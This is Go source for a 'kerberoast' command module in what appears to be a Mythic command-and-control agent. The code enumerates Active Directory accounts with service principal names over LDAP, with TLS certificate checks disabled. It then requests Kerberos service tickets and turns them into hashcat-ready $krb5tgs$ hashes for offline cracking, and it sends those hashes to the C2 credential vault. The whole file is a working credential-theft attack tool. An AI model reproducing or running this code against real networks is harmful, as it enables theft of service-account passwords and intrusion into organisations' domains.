package commands

import (
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/client"
	krbconfig "github.com/jcmturner/gokrb5/v8/config"
)

type KerberoastCommand struct{}

func (c *KerberoastCommand) Name() string        { return "kerberoast" }
func (c *KerberoastCommand) Description() string { return "Request TGS tickets for SPNs and extract hashes for offline cracking (T1558.003)" }

type kerberoastArgs struct {
	Server   string `json:"server"`
	Port     int    `json:"port"`
	Realm    string `json:"realm"`
	Username string `json:"username"`
	Password string `json:"password"`
	SPN      string `json:"spn"`      // optional: specific SPN to roast
	BaseDN   string `json:"base_dn"`  // optional: LDAP base DN
	UseTLS   bool   `json:"use_tls"`  // optional: LDAPS for SPN enumeration
}

func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <DC> -realm <DOMAIN> -username <user@domain> -password <pass>",
			Status:    "error",
			Completed: true,
		}
	}

	var args kerberoastArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" || args.Username == "" || args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: server, username, and password are required. Username should be in UPN format (user@domain.local)",
			Status:    "error",
			Completed: true,
		}
	}

	// Auto-detect realm from username if not specified
	if args.Realm == "" {
		if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Realm = strings.ToUpper(parts[1])
		} else {
			return structs.CommandResult{
				Output:    "Error: realm required. Specify -realm DOMAIN.LOCAL or use UPN username (user@domain.local)",
				Status:    "error",
				Completed: true,
			}
		}
	} else {
		args.Realm = strings.ToUpper(args.Realm)
	}

	if args.Port <= 0 {
		args.Port = 389
	}

	// Step 1: Find kerberoastable SPNs via LDAP (unless specific SPN given)
	var spns []spnEntry
	var err error

	if args.SPN != "" {
		// Single SPN mode
		spns = []spnEntry{{SPN: args.SPN, Account: "(specified)"}}
	} else {
		// Enumerate SPNs via LDAP
		spns, err = enumerateSPNs(args)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error enumerating SPNs via LDAP: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		if len(spns) == 0 {
			return structs.CommandResult{
				Output:    "No kerberoastable accounts found (no user accounts with SPNs)",
				Status:    "success",
				Completed: true,
			}
		}
	}

	// Step 2: Build krb5 config and authenticate
	krb5Conf := buildKrb5Config(args.Realm, args.Server)
	cfg, err := krbconfig.NewFromString(krb5Conf)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Extract username part (before @) for gokrb5
	krbUser := args.Username
	if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
		krbUser = parts[0]
	}

	cl := client.NewWithPassword(krbUser, args.Realm, args.Password, cfg, client.DisablePAFXFAST(true))
	err = cl.Login()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error authenticating to KDC %s: %v", args.Server, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cl.Destroy()

	// Step 3: Request TGS tickets for each SPN
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Kerberoasting %d SPN(s) from %s (KDC: %s)\n", len(spns), args.Realm, args.Server))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	roasted := 0
	var creds []structs.MythicCredential
	for _, entry := range spns {
		ticket, _, err := cl.GetServiceTicket(entry.SPN)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to roast %s (%s): %v\n", entry.SPN, entry.Account, err))
			continue
		}

		// Format as hashcat-compatible $krb5tgs$ hash
		etype := ticket.EncPart.EType
		cipherHex := hex.EncodeToString(ticket.EncPart.Cipher)
		hash := fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s", etype, entry.Account, args.Realm, entry.SPN, cipherHex)

		etypeName := etypeToName(etype)
		sb.WriteString(fmt.Sprintf("\n[+] %s — %s (%s)\n", entry.Account, entry.SPN, etypeName))
		sb.WriteString(hash + "\n")
		roasted++

		// Report TGS hash to Mythic credential vault
		creds = append(creds, structs.MythicCredential{
			CredentialType: "hash",
			Realm:          args.Realm,
			Account:        entry.Account,
			Credential:     hash,
			Comment:        fmt.Sprintf("kerberoast (%s) SPN: %s", etypeName, entry.SPN),
		})
	}

	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 13100 for RC4, -m 19600 for AES128, -m 19700 for AES256)\n", roasted, len(spns)))

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

type spnEntry struct {
	SPN     string
	Account string
}

func enumerateSPNs(args kerberoastArgs) ([]spnEntry, error) {
	// Connect to LDAP to find SPN accounts
	ldapArgs := ldapQueryArgs{
		Server:   args.Server,
		Port:     args.Port,
		Username: args.Username,
		Password: args.Password,
		UseTLS:   args.UseTLS,
	}

	var conn *ldap.Conn
	var err error
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	if ldapArgs.UseTLS {
		if ldapArgs.Port <= 0 {
			ldapArgs.Port = 636
		}
		conn, err = ldap.DialURL(fmt.Sprintf("ldaps://%s:%d", ldapArgs.Server, ldapArgs.Port),
			ldap.DialWithDialer(dialer),
			ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: true}))
	} else {
		if ldapArgs.Port <= 0 {
			ldapArgs.Port = 389
		}
		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:%d", ldapArgs.Server, ldapArgs.Port),
			ldap.DialWithDialer(dialer))
	}
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %v", err)
	}
	defer conn.Close()

	if err := conn.Bind(args.Username, args.Password); err != nil {
		return nil, fmt.Errorf("LDAP bind: %v", err)
	}

	// Detect base DN
	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return nil, fmt.Errorf("base DN detection: %v", err)
		}
	}

	// Search for user accounts with SPNs (exclude krbtgt — it's not crackable)
	filter := "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))"
	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 30, false,
		filter,
		[]string{"sAMAccountName", "servicePrincipalName"},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 100)
	if err != nil {
		return nil, fmt.Errorf("SPN search: %v", err)
	}

	var spns []spnEntry
	for _, entry := range result.Entries {
		account := entry.GetAttributeValue("sAMAccountName")
		for _, s := range entry.GetAttributeValues("servicePrincipalName") {
			spns = append(spns, spnEntry{SPN: s, Account: account})
		}
	}

	return spns, nil
}

func buildKrb5Config(realm, kdc string) string {
	return fmt.Sprintf(`[libdefaults]
  default_realm = %s
  dns_lookup_kdc = false
  dns_lookup_realm = false
  udp_preference_limit = 1

[realms]
  %s = {
    kdc = %s:88
    admin_server = %s
  }
`, realm, realm, kdc, kdc)
}

func etypeToName(etype int32) string {
	switch etype {
	case 17:
		return "AES128-CTS"
	case 18:
		return "AES256-CTS"
	case 23:
		return "RC4-HMAC"
	default:
		return fmt.Sprintf("etype-%d", etype)
	}
}
